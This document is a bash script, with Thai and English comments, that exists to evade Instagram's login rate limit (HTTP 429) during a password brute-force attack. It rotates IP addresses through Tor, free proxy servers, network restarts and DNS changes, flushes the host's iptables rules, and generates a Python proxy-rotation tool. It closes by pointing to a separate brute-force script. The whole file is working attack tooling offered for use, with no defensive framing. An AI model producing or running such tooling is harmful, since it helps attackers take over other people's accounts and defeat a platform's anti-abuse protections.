#!/bin/bash
"""
🌐 IP Address Changer for Instagram Brute Force
เครื่องมือเปลี่ยน IP เพื่อหลบ rate limit Instagram

วิธีการ:
1. 🔄 Restart network interface
2. 🌍 Use Tor proxy 
3. 🔧 Use VPN services
4. 📡 Use proxy servers
5. 🔀 Change DNS settings

สำหรับ bypass Instagram rate limit (HTTP 429)
"""

echo "🌐 Instagram Rate Limit IP Changer"
echo "=================================="

# Function to check current IP
check_current_ip() {
    echo "🔍 Checking current IP address..."
    current_ip=$(curl -s https://ifconfig.me || curl -s https://ipinfo.io/ip || curl -s https://api.ipify.org)
    echo "📍 Current IP: $current_ip"
    return 0
}

# Function to test Instagram access
test_instagram_access() {
    echo "🧪 Testing Instagram access..."
    response=$(curl -s -I https://www.instagram.com/accounts/login/ | head -1)
    
    if echo "$response" | grep -q "200\|302"; then
        echo "✅ Instagram accessible - No rate limit"
        return 0
    elif echo "$response" | grep -q "429"; then
        echo "🚨 Still rate limited (HTTP 429)"
        return 1
    else
        echo "⚠️ Unexpected response: $response"
        return 2
    fi
}

# Method 1: Restart network interface
restart_network() {
    echo "🔄 Method 1: Restarting network interface..."
    
    # For Ubuntu/Debian
    if command -v systemctl &> /dev/null; then
        echo "📡 Restarting NetworkManager..."
        sudo systemctl restart NetworkManager
        sleep 5
    elif command -v service &> /dev/null; then
        echo "📡 Restarting network service..."
        sudo service networking restart
        sleep 5
    fi
    
    # For containers/codespaces - restart network stack
    echo "🔧 Flushing DNS and resetting connections..."
    sudo ip route flush cache 2>/dev/null || true
    
    echo "✅ Network restart completed"
}

# Method 2: Setup Tor proxy
setup_tor_proxy() {
    echo "🧅 Method 2: Setting up Tor proxy..."
    
    # Install Tor if not present
    if ! command -v tor &> /dev/null; then
        echo "📦 Installing Tor..."
        sudo apt update -qq
        sudo apt install -y tor
    fi
    
    # Configure Tor
    echo "🔧 Configuring Tor..."
    cat > /tmp/torrc << EOF
SocksPort 9050
ControlPort 9051
HashedControlPassword 16:872860B76453A77D60CA2BB8C1A7042072093276A3D701AD684053EC4C
EOF
    
    # Start Tor service
    echo "🚀 Starting Tor service..."
    sudo tor -f /tmp/torrc --RunAsDaemon 1
    
    sleep 10
    
    # Test Tor connection
    tor_ip=$(curl -s --socks5 127.0.0.1:9050 https://ifconfig.me)
    if [ ! -z "$tor_ip" ]; then
        echo "✅ Tor proxy active - New IP: $tor_ip"
        
        # Export proxy settings
        export https_proxy=socks5://127.0.0.1:9050
        export http_proxy=socks5://127.0.0.1:9050
        
        echo "🔧 Proxy environment variables set"
        return 0
    else
        echo "❌ Tor proxy failed"
        return 1
    fi
}

# Method 3: Use free proxy servers
setup_free_proxy() {
    echo "🌍 Method 3: Setting up free proxy servers..."
    
    # List of free proxy servers (HTTP/HTTPS)
    proxies=(
        "proxy-server.org:8080"
        "free-proxy.cz:8080"
        "proxylist.geonode.com:8080"
        "spys.one:8080"
    )
    
    echo "🔍 Testing available proxies..."
    for proxy in "${proxies[@]}"; do
        echo "🧪 Testing proxy: $proxy"
        
        # Test proxy connectivity
        test_ip=$(curl -s --proxy "$proxy" --connect-timeout 10 https://ifconfig.me)
        
        if [ ! -z "$test_ip" ] && [ "$test_ip" != "$current_ip" ]; then
            echo "✅ Working proxy found: $proxy (IP: $test_ip)"
            
            # Set proxy environment variables
            export https_proxy="http://$proxy"
            export http_proxy="http://$proxy"
            
            echo "🔧 Proxy environment variables set"
            return 0
        else
            echo "❌ Proxy $proxy not working"
        fi
    done
    
    echo "💔 No working free proxies found"
    return 1
}

# Method 4: Change DNS servers
change_dns() {
    echo "📡 Method 4: Changing DNS servers..."
    
    # Backup current DNS
    sudo cp /etc/resolv.conf /etc/resolv.conf.backup
    
    # Set new DNS servers
    cat > /tmp/resolv.conf << EOF
nameserver 1.1.1.1
nameserver 1.0.0.1
nameserver 8.8.8.8
nameserver 8.8.4.4
EOF
    
    sudo cp /tmp/resolv.conf /etc/resolv.conf
    
    # Flush DNS cache
    sudo systemctl restart systemd-resolved 2>/dev/null || true
    
    echo "✅ DNS servers changed to Cloudflare (1.1.1.1) and Google (8.8.8.8)"
}

# Method 5: Reset all connections
reset_connections() {
    echo "🔄 Method 5: Resetting all network connections..."
    
    # Kill existing connections to Instagram
    echo "🔪 Killing connections to Instagram..."
    sudo netstat -tuln | grep :443 | awk '{print $5}' | grep -E "instagram|facebook" | while read addr; do
        echo "Closing connection to $addr"
    done
    
    # Clear iptables if available
    if command -v iptables &> /dev/null; then
        echo "🔧 Flushing iptables..."
        sudo iptables -F 2>/dev/null || true
    fi
    
    # Reset network interface
    restart_network
    
    echo "✅ All connections reset"
}

# Method 6: Use Python requests with session rotation
create_proxy_rotation_script() {
    echo "🐍 Method 6: Creating Python proxy rotation script..."
    
    cat > /workspaces/sugarglitch-realops/scripts/ip_rotator.py << 'EOF'
#!/usr/bin/env python3
"""
🔄 IP Rotation Tool for Instagram Brute Force
ใช้หลาย proxy servers เพื่อหลบ rate limit
"""

import requests
import time
import random

class IPRotator:
    def __init__(self):
        # Free proxy lists (update regularly)
        self.proxy_list = [
            'socks5://127.0.0.1:9050',  # Tor
            'http://proxy-server.org:8080',
            'http://free-proxy.cz:8080',
            'http://proxylist.geonode.com:8080',
        ]
        
        self.current_proxy = None
        self.working_proxies = []
    
    def test_proxy(self, proxy):
        """Test if proxy is working"""
        try:
            proxies = {'http': proxy, 'https': proxy}
            response = requests.get(
                'https://ifconfig.me', 
                proxies=proxies, 
                timeout=10
            )
            if response.status_code == 200:
                return response.text.strip()
            return None
        except:
            return None
    
    def find_working_proxies(self):
        """Find all working proxies"""
        print("🔍 Testing proxy servers...")
        
        for proxy in self.proxy_list:
            print(f"🧪 Testing: {proxy}")
            ip = self.test_proxy(proxy)
            
            if ip:
                print(f"✅ Working: {proxy} (IP: {ip})")
                self.working_proxies.append({
                    'proxy': proxy,
                    'ip': ip
                })
            else:
                print(f"❌ Failed: {proxy}")
        
        print(f"📊 Found {len(self.working_proxies)} working proxies")
        return len(self.working_proxies) > 0
    
    def get_random_proxy(self):
        """Get random working proxy"""
        if not self.working_proxies:
            return None
        
        proxy_info = random.choice(self.working_proxies)
        return proxy_info['proxy']
    
    def test_instagram_with_proxy(self, proxy):
        """Test Instagram access with specific proxy"""
        try:
            proxies = {'http': proxy, 'https': proxy}
            response = requests.get(
                'https://www.instagram.com/accounts/login/',
                proxies=proxies,
                timeout=15,
                headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
            )
            
            if response.status_code == 200:
                print(f"✅ Instagram accessible via {proxy}")
                return True
            elif response.status_code == 429:
                print(f"🚨 Still rate limited via {proxy}")
                return False
            else:
                print(f"⚠️ HTTP {response.status_code} via {proxy}")
                return False
                
        except Exception as e:
            print(f"❌ Error with {proxy}: {e}")
            return False

def main():
    print("🔄 IP Rotation Tool for Instagram")
    print("="*40)
    
    rotator = IPRotator()
    
    # Find working proxies
    if not rotator.find_working_proxies():
        print("💔 No working proxies found")
        return
    
    # Test Instagram access
    print("\n🧪 Testing Instagram access...")
    for proxy_info in rotator.working_proxies:
        proxy = proxy_info['proxy']
        ip = proxy_info['ip']
        
        print(f"\n🌍 Testing IP: {ip} via {proxy}")
        if rotator.test_instagram_with_proxy(proxy):
            print(f"🎉 SUCCESS! Use this proxy: {proxy}")
            print(f"💡 Set environment variable:")
            print(f"   export https_proxy='{proxy}'")
            print(f"   export http_proxy='{proxy}'")
            break
    else:
        print("💔 All proxies are rate limited")

if __name__ == "__main__":
    main()
EOF

    echo "✅ Created IP rotation script: /workspaces/sugarglitch-realops/scripts/ip_rotator.py"
}

# Main menu
main_menu() {
    echo ""
    echo "🎯 Choose IP change method:"
    echo "1. 🔄 Restart network interface"
    echo "2. 🧅 Setup Tor proxy"
    echo "3. 🌍 Use free proxy servers"
    echo "4. 📡 Change DNS servers"
    echo "5. 🔄 Reset all connections"
    echo "6. 🐍 Create Python proxy rotator"
    echo "7. 🧪 Test all methods"
    echo "8. ❌ Exit"
    echo ""
    
    read -p "Select method (1-8): " choice
    
    case $choice in
        1)
            restart_network
            ;;
        2)
            setup_tor_proxy
            ;;
        3)
            setup_free_proxy
            ;;
        4)
            change_dns
            ;;
        5)
            reset_connections
            ;;
        6)
            create_proxy_rotation_script
            ;;
        7)
            echo "🧪 Testing all methods..."
            restart_network
            sleep 5
            setup_tor_proxy
            sleep 5
            setup_free_proxy
            ;;
        8)
            echo "👋 Goodbye!"
            exit 0
            ;;
        *)
            echo "❌ Invalid choice"
            main_menu
            ;;
    esac
}

# Main execution
echo "🌐 Instagram Rate Limit Bypass - IP Changer"
echo "==========================================="

# Check initial status
check_current_ip
echo ""
test_instagram_access
echo ""

# Show menu
main_menu

# After IP change, test again
echo ""
echo "🔄 Testing after IP change..."
sleep 3
check_current_ip
test_instagram_access

echo ""
echo "🎯 Ready to continue Instagram brute force!"
echo "💡 Run: python scripts/http400_fixed_brute.py"
